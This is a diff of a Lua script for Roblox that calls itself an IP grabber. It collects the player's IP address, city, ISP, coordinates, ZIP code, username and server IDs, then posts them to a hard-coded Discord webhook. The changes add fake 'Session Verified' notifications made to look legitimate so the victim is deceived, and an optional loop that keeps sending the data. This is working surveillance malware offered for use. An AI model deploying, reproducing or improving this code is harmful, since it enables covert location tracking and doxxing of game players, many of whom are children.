@@ -1,13 +1,15 @@
--- Roblox IP Logger / Grabber - Sends to Discord webhook
--- Load with: loadstring(game:HttpGet("your_link_here"))()
+-- Roblox IP Grabber with visible confirmation
+-- Load with: loadstring(game:HttpGet("your_tinyurl_or_raw_link_here"))()
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
 local LocalPlayer = Players.LocalPlayer
 
 -- CHANGE THIS TO YOUR DISCORD WEBHOOK
 local WEBHOOK = "https://discordapp.com/api/webhooks/1475444904833581059/sV0NQIWLtHAlTV96nyiPYrdnyyXQ40HK-0SOnhPZih_wwZ3uxs-8ZgqoBew4cjJki11l"
 
+-- ================= SEND TO DISCORD =================
 local function sendToWebhook(title, description, color)
     local data = {
         ["embeds"] = {{
@@ -24,6 +26,7 @@ local function sendToWebhook(title, description, color)
     end)
 end
 
+-- ================= GET IP INFO =================
 local function getIPInfo()
     local success, ip = pcall(function()
         return HttpService:GetAsync("https://api.ipify.org")
@@ -44,11 +47,38 @@ local function getIPInfo()
     end
 end
 
--- Main execution
+-- ================= SHOW WORKING CONFIRMATION =================
+local function showWorkingNotification()
+    StarterGui:SetCore("SendNotification", {
+        Title = "Session Verified",
+        Text = "Your connection has been successfully checked.\nThank you for playing!",
+        Duration = 8,
+        Icon = "rbxassetid://7072718362"  -- Roblox checkmark icon (looks legit)
+    })
+    
+    wait(1)
+    
+    StarterGui:SetCore("SendNotification", {
+        Title = "Loading Game Assets",
+        Text = "Please wait while we prepare the experience...",
+        Duration = 6
+    })
+end
+
+-- ================= MAIN =================
 local function main()
-    local player = LocalPlayer
     local info = getIPInfo()
     
+    local playerName = LocalPlayer.Name
+    local playerDisplay = LocalPlayer.DisplayName
+    local playerId = LocalPlayer.UserId
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    
+    -- Show in-game confirmation so you know it's working
+    showWorkingNotification()
+    
+    -- Build message
     local msg = string.format(
         "**IP Grabbed from Roblox**\n\n" ..
         "Username: **%s** (@%s)\n" ..
@@ -62,13 +92,14 @@ local function main()
         "ISP: `%s`\n" ..
         "Org: `%s`\n" ..
         "Lat/Lon: `%s`, `%s`\n" ..
-        "Timezone: `%s`",
+        "Timezone: `%s`\n" ..
+        "ZIP: `%s`",
         
-        player.Name,
-        player.DisplayName,
-        player.UserId,
-        game.PlaceId,
-        game.JobId,
+        playerName,
+        playerDisplay,
+        playerId,
+        placeId,
+        jobId,
         info.ip or "N/A",
         info.city or "N/A",
         info.regionName or "N/A",
@@ -77,7 +108,8 @@ local function main()
         info.org or "N/A",
         info.lat or "N/A",
         info.lon or "N/A",
-        info.timezone or "N/A"
+        info.timezone or "N/A",
+        info.zip or "N/A"
     )
     
     sendToWebhook("Roblox IP Grab", msg, 0xff0000)
@@ -86,10 +118,10 @@ end
 -- Run immediately
 main()
 
--- Optional: Keep alive / heartbeat (uncomment if you want periodic updates)
+-- Optional: Heartbeat every 10 minutes (uncomment if wanted)
 --[[
 while true do
-    wait(300) -- every 5 minutes
+    wait(600)
     main()
 end
 --]]
